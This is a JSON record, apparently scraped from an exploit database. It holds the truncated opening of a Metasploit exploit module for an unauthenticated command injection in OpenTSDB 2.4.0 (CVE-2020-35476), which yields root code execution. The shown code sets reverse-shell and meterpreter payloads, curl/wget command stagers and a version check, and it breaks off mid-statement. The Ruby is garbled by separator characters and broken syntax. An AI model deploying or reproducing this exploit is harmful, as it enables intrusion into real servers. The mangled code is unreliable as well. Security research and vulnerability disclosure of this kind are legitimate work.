{
    "text": "vul_name : OpenTSDB 2.4.0 Command Injection ， vul_cve : CVE-2020-35476 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'OpenTSDB 2.4.0 unauthenticated command injection' ,  ， 'Description' => %q{ ， This module exploits an unauthenticated command injection ， vulnerability in the yrange parameter in OpenTSDB through ， 2.4.0 ( CVE-2020-35476 ) in order to achieve unauthenticated ， remote code execution as the root user. ， The module first attempts to obtain the OpenTSDB version via ， the api. If the version is 2.4.0 or lower , the module ， performs additional checks to obtain the configured metrics ， and aggregators. It then randomly selects one metric and one ， aggregator and uses those to instruct the target server to ， plot a graph. As part of this request , the yrange parameter is ， set to the payload , which will then be executed by the target ， This module has been successfully tested against OpenTSDB ， version 2.3.0. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Shai rod' ,  #  @ nightrang3r - discovery and PoC ， 'Erik Wynter' #  @ wyntererik - Metasploit ，  ]  ,  ， ' ，  [ 'CVE' , '2020-35476' ]  ,  ，  [ 'URL' , ' # disclosure and PoC ，  ]  ,  ， 'DefaultOptions' => { ， 'RPORT' => 4242 ， } ,  ， 'Platform' => %w [ unix linux ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'CmdStagerFlavor' => %w [ bourne curl wget ]  ,  ， 'Targets' => [  ，  [  ， 'Automatic ( Unix In-Memory ) ' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' } ,  ， 'Type' => : unix_memory ， } ，  ]  ,  ，  [  ， 'Automatic ( Linux Dropper ) ' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' } ,  ， 'Type' => : linux_dropper ， } ，  ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'DisclosureDate' => '2020-11-18' ,  ， 'DefaultTarget' => 1 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ， register_options [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to OpenTSDB' , '/' ]  )  ,  ，  ]  ， end ， def check ，  # sanity check to see if the target is likely OpenTSDB ， res1 = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path )  ， } )  ， unless res1",
    "time": "2022.12.24"
}